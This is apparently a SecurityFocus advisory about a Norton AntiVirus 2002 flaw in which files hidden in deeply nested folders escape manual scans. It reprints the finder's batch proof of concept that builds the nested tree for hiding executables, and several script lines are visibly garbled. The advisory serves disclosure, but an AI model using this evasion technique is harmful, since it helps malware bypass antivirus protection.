source: http://www.securityfocus.com/bid/10164/info

A vulnerability has been reported in Symantec Norton AntiVirus 2002 that may potentially cause deeply nested files with specific names to bypass manual scanning. 

This could permit malicious executable content to bypass scanning by the software. This may be due to a limitation in the Windows operating system with regards to accessing the deeply nested file. If this is the case, it could also affect other antivirus software.

This issue was present in an early build of Norton AntiVirus 2002 but does not affect fully updated releases.

@echo off
rem Bipin Gautam [hUNT3R]
rem [http://www.geocities.com/visitbipin] * [http://www.01security.com]
echo ?
echo ************************************************
echo -( For a harmless test... you can use,
echo http://www.eicar.org/anti_virus_test_file.htm )-
echo ************************************************
pause
cdc:
cd:hUNT3r
md 1
cd 1
if not errorlevel 1 goto :hUNT3r
cd..
rmdir 1
md X
cls
echo ***************************************************************
echo Now you can inject any file inside the folder 'X' which is inside
echo 120'th sub-directory of 'c:\1' [ i.e c:\1\..\...\.....[120'th dir].....\X\ ]
echo Note: The file you are moving to'c:\1\...\X\' should only contain
echo '1' char. file name, say: '1.exe' or '2.exe' or 'a.exe' etc...
echo not as '123.not' 'qwert.hak'
echo .........
echo So, ARE YOU DONE!?
echo .........
echo After this batch script is terminated, you'll
echo find the file you ^just copied^ inside c:\1\........\Xecho now in c:\3\3\3\3\3\1\1\1\......[130' th dir].....\Xecho mmm... Then have a manual scan of c:\3\ Any file you
echo have put inside the dir. 'X' can't be detected by NORTON Antivirus anymore!!!
echo ***************************************************

pause
cdmd 3\3\3\3\3\3\3\3\3\3cdxcopy /E /I c:\1\*.* c:3\3\3\3\3\3\3\3\3\3exit